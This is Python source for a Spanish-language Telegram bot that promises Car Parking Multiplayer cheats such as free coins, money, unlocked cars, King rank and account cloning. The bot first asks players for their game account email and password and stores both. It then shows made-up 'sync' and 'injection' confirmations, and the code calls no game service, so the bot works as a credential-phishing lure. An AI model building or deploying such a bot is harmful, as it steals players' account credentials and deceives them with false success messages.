import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# El bot lee el Token desde las variables de entorno de Koyeb
TOKEN = os.getenv("TELEGRAM_TOKEN")
bot = telebot.TeleBot(TOKEN)

# Base de datos temporal para guardar credenciales y estados de flujo por cada chat_id
# Estructura: { chat_id: { "estado": "esperando_correo", "correo": "", "clave": "" } }
usuarios_db = {}

# ----------------- MENÚS DE NAVEGACIÓN (BOTONES) -----------------

def menu_opciones_individuales():
    """Genera el panel principal donde el usuario elige una sola opción a la vez."""
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("👑 Activar Rango King (Individual)", callback_data="opc_king"),
        InlineKeyboardButton("💰 Añadir Monedas de Oro (Individual)", callback_data="opc_monedas"),
        InlineKeyboardButton("💵 Añadir Dinero Infinito (Individual)", callback_data="opc_dinero"),
        InlineKeyboardButton("🛞 Desbloquear Rines de Paga (Individual)", callback_data="opc_rines"),
        InlineKeyboardButton("🚗 Desbloquear Todos los Carros (Individual)", callback_data="opc_carros"),
        InlineKeyboardButton("👥 Clonar Cuenta CPM (Individual)", callback_data="opc_clonar"),
        InlineKeyboardButton("🔐 Ver mis Datos Vinculados", callback_data="opc_ver_datos")
    )
    return markup

def menu_confirmar_accion(tipo_funcion):
    """Botones para confirmar o cancelar la solicitud seleccionada."""
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Confirmar Envío", callback_data=f"exec_{tipo_funcion}"),
        InlineKeyboardButton("❌ Cancelar", callback_data="volver_menu")
    )
    return markup

def boton_regresar():
    """Botón simple de retorno al panel de opciones."""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⬅️ Volver al Panel", callback_data="volver_menu"))
    return markup

# ----------------- MANEJADOR DEL COMANDO /START -----------------

@bot.message_handler(commands=['start', 'menu'])
def cmd_start(message):
    chat_id = message.chat.id
    nombre = message.from_user.first_name
    
    # Reiniciar o crear el estado del usuario al usar /start
    usuarios_db[chat_id] = {
        "estado": "esperando_correo",
        "correo": None,
        "clave": None
    }
    
    texto_inicio = (
        f"👋 ¡Hola, {nombre}! Bienvenido al sistema automatizado de Car Parking Multiplayer.\n\n"
        "🔒 **Verificación de Cuenta Obligatoria**\n"
        "Para poder sincronizar y aplicar cualquier cambio directamente en tu partida guardada en la nube, "
        "es necesario iniciar sesión en los servidores del juego.\n\n"
        "👉 Por favor, **escribe y envía el CORREO ELECTRÓNICO** vinculado a tu cuenta de CPM:"
    )
    bot.send_message(chat_id, texto_inicio)

# ----------------- MANEJADOR DE ENTRADA DE TEXTO (ESTADOS) -----------------

@bot.message_handler(func=lambda message: True)
def procesar_entrada_texto(message):
    chat_id = message.chat.id
    texto = message.text.strip()
    
    # Si el usuario no ha iniciado el flujo con /start, ignorar o pedir inicio
    if chat_id not in usuarios_db:
        bot.reply_to(message, "⚠️ Por favor, inicia el proceso usando el comando /start")
        return
        
    estado_actual = usuarios_db[chat_id]["estado"]
    
    # Estado 1: El bot estaba esperando el correo
    if estado_actual == "esperando_correo":
        # Guardar correo y avanzar de estado
        usuarios_db[chat_id]["correo"] = texto
        usuarios_db[chat_id]["estado"] = "esperando_clave"
        
        bot.reply_to(
            message, 
            "📥 **Correo registrado temporalmente.**\n\n"
            "👉 Ahora, por favor, **escribe y envía la CONTRASEÑA** de tu cuenta de Car Parking para completar la vinculación:"
        )
        
    # Estado 2: El bot estaba esperando la contraseña
    elif estado_actual == "esperando_clave":
        # Guardar contraseña y finalizar autenticación simulada
        usuarios_db[chat_id]["clave"] = texto
        usuarios_db[chat_id]["estado"] = "autenticado"
        
        correo_guardado = usuarios_db[chat_id]["correo"]
        
        texto_exito = (
            f"✅ **¡Sincronización Exitosa!**\n\n"
            f"• **Cuenta:** `{correo_guardado}`\n"
            f"• **Estado:** Autenticado y conectado a la nube del juego.\n\n"
            "🔓 El panel de herramientas ha sido desbloqueado con éxito. "
            "Selecciona **una opción a la vez** para proceder con la inyección individual:"
        )
        bot.send_message(chat_id, texto_exito, parse_mode="Markdown", reply_markup=menu_opciones_individuales())
        
    # Si ya está autenticado, cualquier texto plano enviado se le recuerda usar el menú
    elif estado_actual == "autenticado":
        bot.send_message(
            chat_id, 
            "👋 Tu cuenta ya está vinculada en esta sesión. Utiliza los botones interactivos del menú o escribe /start para reiniciar.",
            reply_markup=menu_opciones_individuales()
        )

# ----------------- MANEJADOR DE EVENTOS DE BOTONES -----------------

@bot.callback_query_handler(func=lambda call: True)
def interactuar_botones(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    # Seguridad básica: Si el usuario limpia el historial o intenta usar botones sin loguearse
    if chat_id not in usuarios_db or usuarios_db[chat_id]["estado"] != "autenticado":
        bot.answer_callback_query(call.id, text="⚠️ Debes iniciar sesión primero con /start", show_alert=True)
        return

    datos_usuario = usuarios_db[chat_id]

    # Opción: Regresar al panel principal
    if call.data == "volver_menu":
        bot.answer_callback_query(call.id)
        texto = "👉 Selecciona una sola opción del apartado de Car Parking para gestionar de forma individual:"
        bot.edit_message_text(texto, chat_id, message_id, reply_markup=menu_opciones_individuales())
        return

    # Opción: Mostrar las credenciales guardadas en la sesión
    if call.data == "opc_ver_datos":
        bot.answer_callback_query(call.id)
        texto_datos = (
            f"🔐 **Datos de la Sesión Actual:**\n\n"
            f"• **Correo:** `{datos_usuario['correo']}`\n"
            f"• **Contraseña:** `{datos_usuario['clave']}`\n\n"
            "🔄 Si estos datos son incorrectos, escribe /start para iniciar una nueva vinculación."
        )
        bot.edit_message_text(texto_datos, chat_id, message_id, parse_mode="Markdown", reply_markup=boton_regresar())
        return

    # Diccionario de etiquetas para el flujo de confirmación individual
    diccionario_servicios = {
        "opc_king": "Activación de Rango King",
        "opc_monedas": "Inyección de Monedas de Oro",
        "opc_dinero": "Inyección de Dinero Máximo",
        "opc_rines": "Desbloqueo de Rines de Paga",
        "opc_carros": "Desbloqueo de Todos los Vehículos",
        "opc_clonar": "Clonación Completa de Perfil"
    }

    # Pantalla intermedia de confirmación para procesar una sola opción
    if call.data in diccionario_servicios:
        bot.answer_callback_query(call.id)
        nombre_servicio = diccionario_servicios[call.data]
        bot.edit_message_text(
            text=f"❓ **Confirmación de Acción Individual**\n\n¿Estás seguro de que deseas ejecutar **únicamente** la acción:\n👉 *{nombre_servicio}* en la cuenta `{datos_usuario['correo']}`?",
            chat_id=chat_id,
            message_id=message_id,
            parse_mode="Markdown",
            reply_markup=menu_confirmar_accion(call.data.replace("opc_", ""))
        )

    # Procesamiento y confirmación final de la órden individual
    elif call.data.startswith("exec_"):
        bot.answer_callback_query(call.id)
        funcion_ejecutada = call.data.replace("exec_", "").upper()
        
        texto_final = (
            f"🚀 **Modificación enviada de forma aislada**\n\n"
            f"• **Cuenta Destino:** `{datos_usuario['correo']}`\n"
            f"• **Función Ejecutada:** {funcion_ejecutada}\n"
            f"• **Estado:** En cola de sincronización...\n\n"
            "✨ _La acción se ha procesado de forma única para no interferir con otros datos de tu cuenta. "
            "Regresa al panel si deseas aplicar un cambio distinto._"
        )
        bot.edit_message_text(texto_final, chat_id, message_id, parse_mode="Markdown", reply_markup=boton_regresar())

# ----------------- INICIO DEL SERVIDOR -----------------
if __name__ == "__main__":
    print(">>> Servidor del Bot de Telegram (Sistema por pasos) en línea...")
    bot.polling(none_stop=True)
